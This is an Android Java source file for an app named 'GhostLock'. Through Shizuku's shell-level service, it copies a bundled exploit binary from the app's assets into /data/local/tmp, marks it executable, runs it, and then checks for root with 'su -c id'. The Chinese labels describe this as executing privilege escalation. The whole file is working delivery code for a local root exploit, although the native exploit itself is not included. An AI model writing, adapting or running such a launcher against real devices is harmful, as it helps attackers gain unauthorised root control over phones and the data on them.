package com.ghostlock.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import rikka.shizuku.Shizuku;

public class MainActivity extends Activity {

    private static final String TAG = "Ghostlock";
    private static final String EXPLOIT_BIN = "ghostlock";
    private static final String TARGET_DIR = "/data/local/tmp/a";
    private static final String TARGET_BIN = TARGET_DIR + "/ghostlock";

    private TextView mLog;
    private Button mBtnExec;
    private ScrollView mScroll;
    private final List<String> mLogLines = new ArrayList<>();
    private final Handler mHandler = new Handler(Looper.getMainLooper());

    private IShellService mService;
    private Shizuku.UserServiceArgs mServiceArgs;
    private ServiceConnection mConn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 纯代码构建 UI，不依赖 res
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xff0d0d1a);
        root.setPadding(32, 32, 32, 32);
        
        TextView title = new TextView(this);
        title.setText("GhostLock");
        title.setTextColor(0xffe04040);
        title.setTextSize(24);
        LinearLayout.LayoutParams tp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        tp.bottomMargin = 16;
        root.addView(title, tp);
        
        mScroll = new ScrollView(this);
        mScroll.setBackgroundColor(0xff12122a);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1);
        sp.bottomMargin = 24;
        
        mLog = new TextView(this);
        mLog.setText("等待 Shizuku 连接...");
        mLog.setTextColor(0xff00cc66);
        mLog.setTextSize(11);
        mLog.setTypeface(android.graphics.Typeface.MONOSPACE);
        mLog.setPadding(24, 24, 24, 24);
        mScroll.addView(mLog);
        root.addView(mScroll, sp);
        
        mBtnExec = new Button(this);
        mBtnExec.setText("等待初始化...");
        mBtnExec.setTextColor(0xffffffff);
        mBtnExec.setBackgroundColor(0xffb71c1c);
        mBtnExec.setEnabled(false);
        mBtnExec.setTextSize(16);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 168);
        root.addView(mBtnExec, bp);
        
        setContentView(root);
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkShizuku();
    }

    private void checkShizuku() {
        try {
            int v = Shizuku.getVersion();
            log("Shizuku v" + v + " found");

            if (!Shizuku.pingBinder()) {
                log("Shizuku binder not alive, waiting...");
                Shizuku.addBinderReceivedListener(() -> {
                    log("Shizuku binder received");
                    checkPermission();
                });
            } else {
                checkPermission();
            }
        } catch (Exception e) {
            log("Shizuku not available: " + e.getMessage());
            mBtnExec.setText("不可用");
            mBtnExec.setEnabled(false);
        }
    }

    private void checkPermission() {
        if (!checkShizukuPermission()) {
            log("Requesting Shizuku permission...");
            requestPermission();
        } else {
            log("Shizuku permission GRANTED");
            bindService();
        }
    }

    private boolean checkShizukuPermission() {
        return Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        Shizuku.addRequestPermissionResultListener((code, result) -> {
            if (result == PackageManager.PERMISSION_GRANTED) {
                log("Permission granted!");
                bindService();
            } else {
                log("Permission denied (code=" + code + ")");
            }
        });
        Shizuku.requestPermission(0);
    }

    private void bindService() {
        mServiceArgs = new Shizuku.UserServiceArgs(
            new ComponentName("com.ghostlock.app", "com.ghostlock.app.ShellService"))
            .daemon(false)
            .debuggable(true)
            .version(1);

        mConn = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder binder) {
                mService = IShellService.Stub.asInterface(binder);
                log("UserService connected, uid=" + Shizuku.getUid());
                mBtnExec.setEnabled(true);
                mBtnExec.setText("执行提权");
                mBtnExec.setOnClickListener(v -> executeExploit());
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                mService = null;
                log("UserService disconnected");
            }
        };

        log("Binding UserService...");
        Shizuku.bindUserService(mServiceArgs, mConn);
    }

    private void executeExploit() {
        mBtnExec.setEnabled(false);
        mBtnExec.setText("执行中...");
        new Thread(this::runExploitChain).start();
    }

    private void runExploitChain() {
        try {
            String id = mService.exec("id");
            log("=== 身份验证 ===\n" + id);

            log("=== 释放 exploit 二进制 ===");
            mService.exec("mkdir -p " + TARGET_DIR);

            if (!extractAssetToTarget()) {
                log("FATAL: failed to extract exploit binary");
                return;
            }

            mService.exec("chmod 755 " + TARGET_BIN);
            log("exploit binary written: " + TARGET_BIN);

            log("=== 执行 GhostLock 提权 ===");
            String exploitResult = mService.exec(TARGET_BIN + " 2>&1");
            log(exploitResult);

            String suCheck = mService.exec("su -c 'id' 2>&1");
            log("=== su 验证 ===\n" + suCheck);

        } catch (Exception e) {
            log("exception: " + e.getMessage());
        } finally {
            mHandler.post(() -> {
                mBtnExec.setEnabled(true);
                mBtnExec.setText("重试");
            });
        }
    }

    private boolean extractAssetToTarget() {
        try {
            File privateDir = getFilesDir();
            File tmpBin = new File(privateDir, EXPLOIT_BIN);
            try (InputStream in = getAssets().open(EXPLOIT_BIN);
                 FileOutputStream out = new FileOutputStream(tmpBin)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) {
                    out.write(buf, 0, n);
                }
            }
            tmpBin.setExecutable(true);
            String cmd = "cat " + tmpBin.getAbsolutePath() + " > " + TARGET_BIN + " && chmod 755 " + TARGET_BIN;
            String result = mService.exec(cmd);
            log("extract: " + result);
            return true;
        } catch (Exception e) {
            log("extract failed: " + e.getMessage());
            return false;
        }
    }

    private void log(String msg) {
        mLogLines.add(msg);
        mHandler.post(() -> {
            StringBuilder sb = new StringBuilder();
            for (String l : mLogLines) sb.append(l).append("\n");
            mLog.setText(sb.toString());
            mScroll.post(() -> mScroll.fullScroll(View.FOCUS_DOWN));
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mService != null) {
            try { mService.destroy(); } catch (RemoteException ignored) {}
        }
        Shizuku.unbindUserService(mServiceArgs, mConn, true);
    }
}
